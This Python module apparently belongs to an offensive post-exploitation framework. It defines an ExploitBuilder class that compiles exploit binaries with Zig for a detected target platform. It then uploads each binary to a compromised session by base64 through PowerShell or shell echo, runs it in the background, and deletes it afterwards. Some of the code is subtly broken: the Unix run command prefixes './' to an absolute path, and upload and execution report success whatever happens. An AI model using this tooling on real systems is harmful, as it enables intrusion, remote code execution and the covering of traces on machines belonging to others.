#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Helper class for building and deploying exploits to sessions
"""

import os
import base64
from pathlib import Path
from typing import Optional, Dict, Any
from core.lib.compiler.zig_compiler import ZigCompiler
from core.lib.compiler.platform_detector import PlatformDetector
from core.output_handler import print_info, print_success, print_error, print_warning


class ExploitBuilder:
    """Build and deploy exploits to sessions using Zig cross-compilation"""
    
    def __init__(self, session=None):
        """
        Initialize exploit builder
        
        Args:
            session: Session object for target platform detection
        """
        self.session = session
        self.compiler = ZigCompiler()
        self.platform_detector = PlatformDetector()
        self.output_dir = Path("output")
        self.output_dir.mkdir(exist_ok=True)
    
    def build_and_deploy(self,
                        template_name: str,
                        template_vars: Dict[str, Any],
                        remote_path: Optional[str] = None,
                        execute: bool = True,
                        cleanup: bool = True) -> Optional[str]:
        """
        Build exploit from template and deploy to session
        
        Args:
            template_name: Name of the Zig template
            template_vars: Variables for template
            remote_path: Path on target (default: /tmp/exploit)
            execute: Execute after upload
            cleanup: Remove file after execution
            
        Returns:
            Path to compiled binary or None if failed
        """
        if not self.compiler.is_available():
            print_error("Zig compiler not available")
            return None
        
        # Detect target platform
        platform, arch = self.platform_detector.detect_from_session(self.session)
        print_info(f"Target detected: {platform}/{arch}")
        
        # Generate output filename
        binary_name = f"exploit_{template_name}"
        if platform == 'windows':
            binary_name += ".exe"
        
        output_path = self.output_dir / binary_name
        
        # Compile
        print_info(f"Compiling exploit: {template_name}")
        success = self.compiler.compile_template(
            template_name=template_name,
            output_path=str(output_path),
            target_platform=platform,
            target_arch=arch,
            template_vars=template_vars
        )
        
        if not success:
            return None
        
        # Upload to session
        if self.session:
            remote_path = remote_path or f"/tmp/{binary_name}"
            if self._upload_to_session(str(output_path), remote_path):
                print_success(f"Exploit uploaded to: {remote_path}")
                
                if execute:
                    if self._execute_on_session(remote_path):
                        print_success("Exploit executed successfully")
                        
                        if cleanup:
                            self._cleanup_on_session(remote_path)
                    else:
                        print_error("Failed to execute exploit")
            else:
                print_error("Failed to upload exploit")
        
        return str(output_path)
    
    def build_custom(self,
                    source_code: str,
                    remote_path: Optional[str] = None,
                    execute: bool = True,
                    cleanup: bool = True) -> Optional[str]:
        """
        Build from custom Zig source code
        
        Args:
            source_code: Custom Zig source code
            remote_path: Path on target
            execute: Execute after upload
            cleanup: Remove after execution
            
        Returns:
            Path to compiled binary
        """
        if not self.compiler.is_available():
            print_error("Zig compiler not available")
            return None
        
        # Detect target platform
        platform, arch = self.platform_detector.detect_from_session(self.session)
        print_info(f"Target detected: {platform}/{arch}")
        
        # Generate output filename
        binary_name = "exploit_custom"
        if platform == 'windows':
            binary_name += ".exe"
        
        output_path = self.output_dir / binary_name
        
        # Compile
        print_info("Compiling custom exploit")
        success = self.compiler.compile(
            source_code=source_code,
            output_path=str(output_path),
            target_platform=platform,
            target_arch=arch
        )
        
        if not success:
            return None
        
        # Upload to session
        if self.session:
            remote_path = remote_path or f"/tmp/{binary_name}"
            if self._upload_to_session(str(output_path), remote_path):
                print_success(f"Exploit uploaded to: {remote_path}")
                
                if execute:
                    if self._execute_on_session(remote_path):
                        print_success("Exploit executed successfully")
                        
                        if cleanup:
                            self._cleanup_on_session(remote_path)
                    else:
                        print_error("Failed to execute exploit")
            else:
                print_error("Failed to upload exploit")
        
        return str(output_path)
    
    def _upload_to_session(self, local_path: str, remote_path: str) -> bool:
        """Upload file to session"""
        if not self.session or not hasattr(self.session, 'cmd_exec'):
            return False
        
        try:
            # Read binary file
            with open(local_path, 'rb') as f:
                binary_data = f.read()
            
            # Encode to base64 for transfer
            b64_data = base64.b64encode(binary_data).decode('ascii')
            
            # Detect platform for upload method
            platform, _ = self.platform_detector.detect_from_session(self.session)
            
            if platform == 'windows':
                # Windows: use PowerShell
                ps_cmd = f'''$bytes = [System.Convert]::FromBase64String('{b64_data}'); [System.IO.File]::WriteAllBytes('{remote_path}', $bytes)'''
                result = self.session.cmd_exec(f'powershell -Command "{ps_cmd}"')
            else:
                # Unix: use base64 and dd
                cmd = f"echo '{b64_data}' | base64 -d > {remote_path}"
                result = self.session.cmd_exec(cmd)
                
                # Make executable
                self.session.cmd_exec(f"chmod +x {remote_path}")
            
            return True
        except Exception as e:
            print_error(f"Upload failed: {e}")
            return False
    
    def _execute_on_session(self, remote_path: str) -> bool:
        """Execute binary on session"""
        if not self.session or not hasattr(self.session, 'cmd_exec'):
            return False
        
        try:
            platform, _ = self.platform_detector.detect_from_session(self.session)
            
            if platform == 'windows':
                cmd = remote_path
            else:
                cmd = f"./{remote_path}"
            
            # Execute in background
            if platform == 'windows':
                result = self.session.cmd_exec(f'start /B {cmd}')
            else:
                result = self.session.cmd_exec(f'{cmd} &')
            
            return True
        except Exception as e:
            print_error(f"Execution failed: {e}")
            return False
    
    def _cleanup_on_session(self, remote_path: str) -> bool:
        """Remove file from session"""
        if not self.session or not hasattr(self.session, 'cmd_exec'):
            return False
        
        try:
            platform, _ = self.platform_detector.detect_from_session(self.session)
            
            if platform == 'windows':
                self.session.cmd_exec(f'del /F /Q "{remote_path}"')
            else:
                self.session.cmd_exec(f'rm -f {remote_path}')
            
            return True
        except Exception as e:
            print_warning(f"Cleanup failed: {e}")
            return False

